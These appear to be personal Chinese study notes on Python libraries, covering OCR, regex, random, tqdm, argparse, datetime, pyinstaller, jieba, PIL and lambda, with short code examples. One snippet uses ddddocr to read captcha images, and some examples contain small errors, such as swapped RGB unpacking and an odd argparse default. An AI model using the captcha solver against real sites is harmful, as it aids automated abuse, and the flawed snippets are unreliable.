然后把Tesseract-OCR-v5.0.0的tessdata文件夹复制到C:\Users\dell\AppData\Local\Programs\Python\Python310里。

(1):纯文字识别:
from PIL import Image
from pytesseract import *

def main():
    im = Image.open("a2.png")
    im.show()
    text = image_to_string(im, lang='chi_sim')  # lang指定识别出的语言类型
    print(text)

if __name__ == '__main__':
    main()
(2):验证码识别：
发现里面ddddocr最有用，对于常规验证码图片：
import ddddocr
ocr = ddddocr.DdddOcr()
with open("code (1).png", 'rb') as f:
    img_bytes = f.read()
res = ocr.classification(img_bytes)
print(res)



随机生成数据的faker：
from faker import Faker
fake = Faker('zh_CN')
print(fake.address())

随机生成具体地理位置：
from chinese_address_generator import generator
生成一级地址——省
generator.generatelevel1() #返回字符串
生成二级地址——省、市
generator.generatelevel2() #返回字符串
生成三级地址——省、市、县
generator.generatelevel3() #返回字符串
生成四级地址——省、市、县、街道
generator.generatelevel4() #返回字符串
查看原始数据
import chinese_address_generator
chinese_address_generator.level3_list #三级地址列表
chinese_address_generator.level4_list #四级地址列表

83：re库
单次匹配：re.search(pattern, content)，返回对象，所以用方法。
import re
content = 'My name is Yang ChenXi'
pattern = 'name'
match = re.search(pattern, content)
print(match.start())
print(match.end())

多次匹配：返回匹配组成的列表，['cf', 'cf', 'cf', 'cf', 'cf', 'cf', 'cf', 'cf', 'cf', 'cf']
import re
content = 'cfccfcfcfcfcffcffcccfcfcf'
pattern = 'cf'
for match in re.findall(pattern, content):
    print(match)
获取对应的索引：finditer()返回的是一个对象。
import re
content = 'cfccfcfcfcfcffcffcccfcfcf'
pattern = 'cf'
for match in re.finditer(pattern, content):
    print(match.start(), match.end())
只查看是否字符串匹配：fullmatch()符合匹配则返回一个对象，不符合则返回None.
import re
content = "YangChenXi@163.com"
pattern = "^[A-Za-z0-9\u4e00-\u9fa5]+@[a-zA-Z0-9_-]+(\.[a-zA-Z0-9_-]+)+$"
s = re.fullmatch(pattern, content)
if s is None:
    print('亲，请输入正确的邮箱！！')
else:
    print('亲，你好棒棒欧！！')

替换选中字符串：
"""
re.sub(pattern, repl, string, count=0, flags=0)
在一个字符串中替换所有匹配正则表达式的子串，返回替换后的字符串
- pattern： 正则表达式的字符串或原生字符串表示
- repl:替换匹配字符串的字符串
- string:待匹配字符串
- count：匹配的最大替换次数
- flags:正则表达式使用时的控制标记

"""
def subApiDemo():
    match = re.sub(r'[1-9]\d{5}', ':sucode', 'shenzhen 518000 shenzhen123456')
    print("subApiDemo:" + match)

以选中字符串切割：
"""
re.split(pattern, string, maxsplit=0, flags=0)
将一个字符串按照正则表达式匹配结果进行分割，返回列表类型
- pattern： 正则表达式的字符串或原生字符串表示
- string:待匹配字符串
- maxsplit：最大分割数，剩余部分作为最后一个元素输出
- flags:正则表达式使用时的控制标记
"""
def splitApiDemo():
    # 返回的是一个列表,若将maxsplit设置为1
    ls = re.split(r'[1-9]\d{5}', 'shenzhen 518000 shenzhen123456', 1)
    for info in ls:
        print('split:' + info)

开始位置匹配：
"""
re.match(pattern, string, flags=0)
从一个字符串的开始位置起匹配正则表达式，返回match对象
- pattern： 正则表达式的字符串或原生字符串表示
- string:待匹配字符串
- flags:正则表达式使用时的控制标记
"""
def matchApiDemo():
    match = re.match(r'[1-9]\d{5}', 'shenzhen 518000')
    if match:
        # 无法匹配到
        print('matchApiDemo:' + match.group(0))

    match = re.match(r'[1-9]\d{5}', '518000 shenzhen')
    if match:
        # 从头位置开始就可以了
        print('matchApiDemo:' + match.group(0))



总：
多次匹配(返回匹配到的列表，无索引)findall()
单次匹配(有索引)search()
拿索引finditer()
检测而已fullmatch()
-------------------------------------------------
re.search()	从一个字符串中搜索匹配正则表达式的第一个位置，返回match对象
re.match()	从一个字符串的开始位置起匹配正则表达式，返回match对象
re.findall()	搜索字符串，以列表类型返回全部能匹配的子串
re.split()		将一个字符串按照正则表达式匹配结果进行分割，返回列表类型
re.finditer()	搜索字符串，返回一个匹配结果的迭代类型，每个迭代元素是match对象
re.sub()		在一个字符串中替换所有匹配正则表达式的子串，返回替换后的字符串

match对象属性：
.string	待匹配 的文本
.re	匹配时使用的pattern对象（正则表达式）
.pos	正则表达式搜索文本的开始位置
.endpos	正则表达式搜索文本的结束位置
match对象方法：
.group(0）	获得匹配后的字符串
.start()	匹配字符串在原始字符串的开始位置
.end()	匹配字符串在原始字符串的结束位置
.span()	返回(.start(),.end())

84：random库：
from random import *
seed([x])		改变随机数生成器的种子,默认是系统时间，设置相同的种子，生成随机数相同。程序中要么就不用种子，一用了，其他的random值都会固定，一次种子设置只影响一次random()，剩下的random()虽然都是随机数生成，但是都是固定的随机数。
random()		返回[0,1)内一个随机浮点数
randint(m,n)	返回[m,n]中的一个随机整数
randrange(m,n[,k])	返回[m,n)中以k为步长的一个随机整数	#用来拿奇偶数。
getrandbits(k)	返回一个可以用k位二进制的整数
uniform(m,n)	m,n可以是整型或是浮点型
choice(seq)	返回一个列表、元组或字符串的随机项。
sample(seq,k)	返回k个列表、元组或字符串的随机项。
shuffle(list)	将序列的所有元素随机排序。无返回值

tqdm库：进度条库
import time
from tqdm import tqdm, trange

#trange(i)是tqdm(range(i))的一种简单写法
for i in trange(100):
    time.sleep(0.05)

for i in tqdm(range(100), desc='Processing'):
    time.sleep(0.05)

dic = ['a', 'b', 'c', 'd', 'e']
pbar = tqdm(dic)
for i in pbar:
    pbar.set_description('Processing '+i)
    time.sleep(0.2)
desc是进度条左边的解释性文字，再tqdm()里传参是设置对象属性，也可以通过set_description()方法更改属性值。基本上就是往tqdm函数里传递迭代器即可。
class tqdm(object):
 def __init__(self, iterable=None, desc=None, total=None, leave=False,
               file=sys.stderr, ncols=None, mininterval=0.1,
               maxinterval=10.0, miniters=None, ascii=None,
               disable=False, unit='it', unit_scale=False,
               dynamic_ncols=False, smoothing=0.3, nested=False,
               bar_format=None, initial=0, gui=False):
iterable: 可迭代的对象, 在手动更新时不需要进行设置
desc: 字符串, 左边进度条描述文字
total: 总的项目数
leave: bool值, 迭代完成后是否保留进度条
file: 输出指向位置, 默认是终端, 一般不需要设置
ncols: 调整进度条宽度, 默认是根据环境自动调节长度, 如果设置为0, 就没有进度条, 只有输出的信息
unit: 描述处理项目的文字, 默认是'it', 例如: 100 it/s, 处理照片的话设置为'img' ,则为 100 img/s
unit_scale: 自动根据国际标准进行项目处理速度单位的换算, 例如 100000 it/s >> 100k it/s


85：网络中的发包是按，原本内容先根据编码格式编码成对应的字节流，然后字节流再转换成二进制，接收到的是二进制，自动变成字节，然后再根据编码方式解码。编码是encode()解码是decode(),字符流是在内存中存在，会用到缓冲区，字节流是在硬盘中存在，不用到缓冲区，缓冲区才会用到close()函数。字节流解码成字符流，字符流编码成字节流，这里用的都是utf-8/gbk/gb2312等。但是用不到Unicode,因为Unicode是字符流才用到的，Unicode是字符集，不是编码规则，de/encode里没有Unicode。字节流不能直接处理Unicode字符，字符流就可以。所以文本文件应该是对应的内容在内存里直接就是对应的Unicode字符，同时一个字符占据了两个字节，然后把两个字节的Unicode字符进行编码成字节流存储。所以网络发包里的字节流，要先解码，不能直接用
字符流：二进制数据 --编码-> 字符编码表 --解码-> 二进制数据
字节流：二进制数据 —> 二进制数据


86：python指针
http://t.csdn.cn/dhgBp
不可变对象：int(整形)、str(字符串)、float(浮点型)、tuple(元组)
可变对象：dict(字典)、list(列表)、 set(集合）自定义类

87：脚本参数库（argparse）：
先创建一个对象，然后添加对应的属性，最后获取新对象，打印对应的属性值即可。
import argparse
parser=argparse.ArgumentParser()
parser.add_argument('--bb-a',type=bool,default=250)
args=parser.parse_args()
print(args.bb_a)

参数名字可以是--a或者-a都行，cmd里填对应的就可以了，--a-b的情况会被解析为--a_b,所以参数名字是--A-B的时候，代码调用要用A_B.
参数类型是bool时，只有为空才是false值，其它都是true，只有bool类型可以赋空值，其它都不能赋空值。参数类型是str的，需要输入的是双引号。
list类型会把参数全部当作字符串然后list()显示。
所以封装函数直接调用属性就行。
import argparse
def getcmd():
    parser=argparse.ArgumentParser()
    parser.add_argument('--bb-a',type=bool,default=250)
    args=parser.parse_args()
    return args

QQ或微信循环发信息，缺点一，运行期间不能动鼠标，应该切后台运行。缺点二，速度太慢，最快每秒一条吧。
88：pyechars库(数据可视化)

89：platform库(获取运行平台的系统信息)
import platform
platform.platform()
获取系统名，版本：Windows-10-10.0.19041-SP0
platform.python_build()
获取python环境的名称和版本发行日期：('default', 'Jul  2 2020 17:30:36')
platform.python_version()
获取运行python的版本：3.8.3
platform.release()
获取系统的发布：10
platform.system()
获取系统/OS的名字：Windows
platform.version()
获取系统的发布版本：10.0.19041
platform.processor()
获取处理器名称：Intel64 Family 6 Model 140 Stepping 1, GenuineIntel
platform.machine()
获取CPU架构：AMD64
platform.node()
获取计算机名称：host-hdz
platform.uname()
获取较全面的信息：
uname_result(system='Windows', node='host-hdz', release='10', version='10.0.19041', machine='AMD64', processor='Intel64 Family 6 Model 
140 Stepping 1, GenuineIntel')



90:OS模块：
os.__file__是指OS.py所在的绝对路径，比如本机上的路径就是E:\anaconda3\lib\os.py
Windows文件路径：\\site-packages\\chinese_address_generator\\src\\level4.txt
Linux文件路径：/site-packages/chinese_address_generator/src/level4.txt
方向相反。



91：timedate模块：
进度条的基本原理就两个小点：
print('\r['+p1+p2+']'+str(t),end='')一个是\r的含义是将光标的位置回退到本行的开头位置，第二个就是end=''。

这个模块有两个常量：datetime.MINYEAR和datetime.MAXYEAR,分别表示datetime所能表示的最小和最大年份：1和9999.
分为5个子模块(五个类)：
datetime.date日期表示类，表示年月日等。
datetime.time时间表示类，表示小时，分钟，秒，毫秒等。
datetime.datetime日期和时间表示的类，功能覆盖date和time 类
datetime.timedelta与时间间隔有关的类
datetime.tzinfo与时区有关的信息表示类
针对datetime类：
创建类对象的三种方式是：datetime.now()、datetime.utcnow()、datetime()
datetime.now()	2023-03-01 18:04:08.703447	获取当前日期和时间，精确到微秒
datetime.utcnow()	2023-03-01 10:04:35.496158	获取UTC时间对象，精确到微秒
datetime(2022,1,1,1,1,1,888)	2022-01-01 01:01:01.000888	创建指定的时间对象
上面三种每一个对象的属性都有：
.min	固定返回datetime的最小时间对象，datetime(1,1,1,0,0)
.max	固定返回datetime的最大时间对象，datetime(9999,12,31,23,59,59,999999)
.year
.month
.day
.hour
.minute
.second
.microsecond
datetime类对象的常用时间格式化方法：对象.isoformat()、.isoweekday()、.strftime()。
.isoformat()	2023-03-01T18:13:38.310759		返回ISO 8601标准显示时间
.isoweekday()	3	返回星期几
.strftime("%Y-%m-%d %H")		2023-03-01 18	返回指定的时间格式
对strftime()方法可以指定的格式有：
%a 输出当前是星期几的英文简写	Wed 
%A 输出完整的星期几名称英文	Wednesday 
%b  输出月份的英文简写	Mar 
%B 输出月份的英文完整名称	March
%c 以本地时间显示日期和时间	Wed Mar  1 18:24:14 2023   
%d 显示1-31之间的数，每月的第几天，也就是年月日中的日	01 
%H  以24小时制显示小时，比如	18 
%I 以12小时制的方式显示当前小时，例如当前jb51.net服务器的时间为晚上21点，使用%I显示09		06
%j 显示当前日期为一年中的第几天，如当前jb51.net服务器时间为2013年9月15日，则显示为258，也就是一年中的第258天	060  
%m 显示1-12之间的月份	 03  
%M 显示00-59之间的分钟数	24
%p 以 A.M./P.M.方式显示是上午还是下午		PM   
%S 显示0-59之间的秒数	20 
%U 显示一年中的第几周，星期天为一周的第一天，例如当前www.jb51.net服务器时间为2013年9月15日，星期天，显示为第37周	 09
%w  显示一周中的第几天，其中星期天为0，星期一为1，例如：jb51.net当前日期为2013年9月17日星期二，则显示结果为2
%W 显示一年中的第几周，和U%把不同的是星期一为一周的第一天，例如当前www.jb51.net服务器时间为2013年9月17日，星期二，显示为第37周，范围在0-51之间
%x 显示年月日	03/01/23
%X 显示时分秒	07:55:04 
%y 显示(00 - 99) 之间的年份，例如：jb51.net服务器时间为：2013年9月17日，则显示结果为13
%Y 显示完整年份，例如：jb51.net服务器时间为：2013年9月17日，则显示结果为2013
%z, %Z 输出时区，如果不能显示，则显示为空字符 %%  用于显示%符号


92:打包模块pyinstaller：
打包命令：
pyinstaller python文件的绝对路径/相对路径	
pyinstaller -F python文件的绝对路径/相对路径	dist目录中只出现exe目标程序。-F的exe会比无-F的文件大很多。
命令执行后目录中会出现两个新目录：build和dist,
build目录存储临时文件的目录，可以删除，dist目录里的exe文件是最后的结果，把dist目录的全部文件拷贝到别人电脑就可以使用了。
执行的时候在cmd里输入exe文件的绝对路径执行：D:\python\python文件\工作区1.code_workspace\dist\load_history.exe
通过打包可以发现，写代码的时候应当有个良好的习惯，用什么函数导什么函数，不要上来 import 整个库，最后你会发现你一个 100KB 的代码打包出来有 500MB。
当你的代码需要调用一些图片和资源文件的，这是不会自动导入的，需要你自己手动复制进去才行。不然 exe 文件运行时命令窗口会报错找不到这个文件。
打包还可以打包成窗口程序，还有更深内容可以挖掘。
注意点：
文件路径中不能出现空格和.
python编码必须是UTF-8


93:
.py：这通常是您编写的输入源代码。
.py3: Python3脚本（Python3脚本通常以.py而不是.py3结尾，很少使用）
.pyc：这是编译好的字节码。如果您导入一个模块，python将生成一个*.pyc包含字节码的文件，以便以后再次导入它更容易(也更快)。.pyc二进制文件可以反编译成.py文件，反编译软件叫Easy Python Decompiler。
.pyo：这是在优化(-O)时创建的*.pyc文件,从Python3.5开始，Python将只使用pyc而不是pyo和pyc
.pyd：这基本上是一个Windows DLL文件。
.pyi : MyPy存根,存根文件（PEP 484）.
.pyw : 用pythonw.exe执行的Windows的Python脚本
.pyx : 将Cython src转换为C/C++
.pyz : Python脚本归档（PEP 441）（这是一个包含标准Python脚本头之后的二进制形式的压缩Python脚本（ZIP）的脚本）
.pywz : 用于MS-Windows的Python脚本归档（PEP 441）（这是一个包含标准Python脚本头之后的二进制形式的压缩Python脚本（ZIP）的脚本）
.py [cod] : .gitignore中的通配符表示该文件可能是.pyc，.pyo或.pyd
.rpy : 包含应用程序或框架特定功能的RPython脚本或Python脚本
.pyde : 处理使用的Python脚本
.pyp : Py4D Python插件
.pyt : Python声明文件
.dll/ocx/so：是动态链接库
.a是静态链接库

94：jieba库：中文分词函数库：
jieba.cut(s)		精确模式，返回一个可迭代的数据类型
jieba.cut(s,cut_all=True)	全模式，输出文本s中所有可能的单词
jieba.cut_for_search(s)	搜索引擎模式，适合搜索引擎建立索引的分词结果。
jieba.lcut(s)		精确模式，返回一个列表类型，建议使用
jieba.lcut(s,cut_all=True)	全模式，返回一个列表类型，建议使用
jieba.lcut_for_search(s)	搜索引擎模式，返回一个列表类型，建议使用
jieba.add_word(s)		向分词词典中添加一个新词。
不加l的方法返回的是迭代对象，迭代才能打印，加l的返回的是分词列表。cut_all=True可以更加精确的分词，冗余性更大。
添加词要记得先添加再分词。统计词频需要先分词看看要不要添新词，然后再看看有没有同义词，设计结构来统计。


95：PIL库的使用：
pillow库可以加载几乎所有的图片格式，下有21个子库。
主要学习其中的Image库：
Image.open(filename)		根据绝对路径/相对路径加载图片
Image.new(mode,size,color)		根据给定参数创建一个新的图像
Image.open(StringIO.StringIO(buffer))	从字符串中获取图像		
Image.frombytes(mode,size,color)	根据像素点data创建图像		
Image类对象.verify()			对图像的完整性进行检查，返回异常
从字符串中读取图片类型，有的图片类型是经过压缩形成的，所以还需要解码。
Image类对象的常用属性有：
Image.format		标识图片后缀名或来源，如果图像不是从文件读取，值为None
Image.mode 		图像的色彩模式，"L"为灰度图像，"RGB"为真彩色图像，"CMYK"为出版图像
Image.size		图像的宽高，单位是像素(px)，返回二元元组
Image.palette		调色板属性，返回一个ImagePalette类型
Image.open打开gif格式的图片，每一帧是png格式，保存也是png格式。
Image类对象的转换和保存方法：
Image.save(filename,format)	format是文件后缀，如果文件名里包括了后缀则忽略format
Image.convert(mode)	用不同的参数，把图片转换为新的模式
Image.thumbnail(size)	创建图像的缩略图，size是缩略图尺寸的二元元组(200,100)
Image.resize(size)		按size大小调整图像，生成副本。size是缩略图尺寸的二元元组(200,100)
Image.rotate(angle)		按angle角度旋转图像，生成副本。rotate(90)
生成副本的要用新变量来承接，也可以直接b.resize((200,100)).show()展示，没有生成副本的就不能这样。
Image类对象的图像像素和通道处理方法：
Image.point(func)		根据函数func的功能对每个元素进行运算，返回图像副本
Image.split()		提取RGB通道的每个颜色通道，返回图像副本	r,g,b2=b.split()；r=a.split()
Image.merge(mode,bands)	合并通道，其中mode表示色彩，bands表示新的色彩通道，Image.merge('RGB',(g,b,r))
Image.blend(im1,im2,alpha)	将两副图片im1和im2按照如下公式插值后生成新的图像：im1*(1.0-alpha)+im2*alpha
用split分离色彩通道之前，先查看图片的色彩模式是哪种，RGB有三个色彩通道，所以可以分离三个结果出来，split()返回值有三个，如果是P色彩模式，返回值只有一个。
point()函数与lambda函数可以结合对像素通道每个像素进行处理。
例子：
from PIL import Image
a=Image.open('./a.jpg')
print(a.mode)
r,g,b=a.split()
g=g.point(lambda i:i*0.9)
b=b.point(lambda i:i<100)
om=Image.merge(a.mode,(r,g,b))
om.show()
PIL类的ImageFilter类和ImageEnhance类提供了过滤图像和增强图像的方法：ImageFilter类共提供10种预定义图像过滤方法，都会产生副本：
ImageFilter.BLUR			图像模糊效果
ImageFilter.CONTOUR		图像轮廓效果
ImageFilter.DETAIL			图像细节效果
ImageFilter.EDGE_ENHANCE		图像边界加强效果
ImageFilter.EDGE_ENHANCE_MORE	图像的阈值边界加强效果
ImageFilter.EMBOSS		图像浮雕效果
ImageFilter.FIND_EDGES		图像的边界效果
ImageFilter.SMOOTH		图像平滑效果
ImageFilter.SMOOTH_MORE		图像阈值平滑效果
ImageFilter.SHARPEN		图像锐化效果
通过Image类对象使用ImageFilter类的方式：
Image对象.filter(ImageFilter.BLUR)
ImageEnhance类提供图像增强功能，共五个，都生成副本：
ImageEnhance.enhance(factor)	对选择属性的数值增强factor倍
ImageEnhance.Color(im)		调整图像的颜色平衡
ImageEnhance.Contrast(im)		调整图像的对比度
ImageEnhance.Brightness(im)		调整图像的亮度
ImageEnhance.Sharpness(im)		调整图像的锐度
例子：
from PIL import Image
from PIL import ImageEnhance
a=Image.open('./v1.jpg')
b=ImageEnhance.Contrast(a)
b.enhance(10).show()
这个类是先选择模式，再对产生的副本进行倍数变化。


图像转字符画：
步骤：先把图像转换为灰度照片，然后获取像素宽高，把每个像素转换为对应的字符，打印即可。
原理：因为彩色照片的色彩无法被字符直接模拟，所以要变成灰度照片，变成灰度照片有两个方式，一个是用Image函数库提供的.convert("L")方式，直接拿灰度值就好，另一个是自己用对应的公式去求灰度值，然后用得到的灰度值按大小替换成对应的字符。
注意点：
getpixel（）函数是用来获取图像中某一点的像素的RGB颜色值，返回(238, 238, 238)，如果照片是其它的模式比如p，那么返回的就是一个值。
这个转换效果根据具体的图片可以具体调整的因素有(影响比较大的)：字符串的顺序与内容，图片resize的大小，灰度值转换公式的其它比例。
最后的文本字体还要调整成宋体，小六配合Ctrl+滚轮查看效果。
在python2环境中编写python代码时，如果代码（或者注释）有中文，需要在python文件的开头加入：
# -*- coding: UTF-8 -*-
或者
# coding=utf-8

代码：
# -*- coding: utf-8 -*-
from PIL import Image

codeLib = '''@B%8&WM#*oahkbdpqwmZO0QLCJUYXzcvunxrjft/\|()1{}[]?-_+~<>i!lI;:,"^`'. '''#生成字符画所需的字符集
count = len(codeLib)

def transform1(image_file):
    image_file = image_file.convert("L")#转换为黑白图片，参数"L"表示黑白模式
    codePic = ''
    for h in range(0,image_file.size[1]):  #size属性表示图片的分辨率，'0'为横向大小，'1'为纵向
        for w in range(0,image_file.size[0]):
            gray = image_file.getpixel((w,h)) #返回指定位置的像素，如果所打开的图像是多层次的图片，那这个方法就返回一个元组
            codePic = codePic + codeLib[int(((count-1)*gray)/256)]#建立灰度与字符集的映射
        codePic = codePic+'\n'
    return codePic

def transform2(image_file):
    codePic = ''
    for h in range(0,image_file.size[1]):
        for w in range(0,image_file.size[0]):
            g,r,b = image_file.getpixel((w,h))
            gray = int(r* 0.299+g* 0.587+b* 0.114)
            codePic = codePic + codeLib[int(((count-1)*gray)/256)]
        codePic = codePic+'\r\n'
    return codePic



image_file = Image.open('暴走.jpg')
image_file=image_file.resize((int(image_file.size[0]*0.75), int(image_file.size[1]*0.5)))#调整图片大小
print('Info:',image_file.size[0],' ',image_file.size[1],' ',count)

with open('tmp.txt','w') as tmp:
    tmp.write(transform1(image_file))



96:lambda语法小结：
1、将lambda函数赋值给一个变量，通过这个变量间接调用该lambda函数。
示例：
add = lambda x, y: x+y
相当于定义了加法函数lambda x, y: x+y，并将其赋值给变量add，这样变量add就指向了具有加法功能的函数。
这时我们如果执行add(1, 2)，其输出结果就为 3。
2、将lambda函数赋值给其他函数，从而将其他函数用该lambda函数替换。
示例：
# 为了把标准库time中的函数sleep的功能屏蔽(Mock)，我们可以在程序初始化时调用：
time.sleep=lambda x: None
# 这样，在后续代码中调用time库的sleep函数将不会执行原有的功能。
# 例如：
time.sleep(3)	# 程序不会休眠 3 秒钟，而是因为lambda输出为None，所以这里结果是什么都不做
3、将lambda函数作为参数传递给其他函数。
y.sort(key=lambda x:(x[2],x[0]),reverse=True)
random.sort(key=lambda student: student[1])
4：lambda与三目运算符结合：
lambda a : True if (a > 10 and a < 20) else False




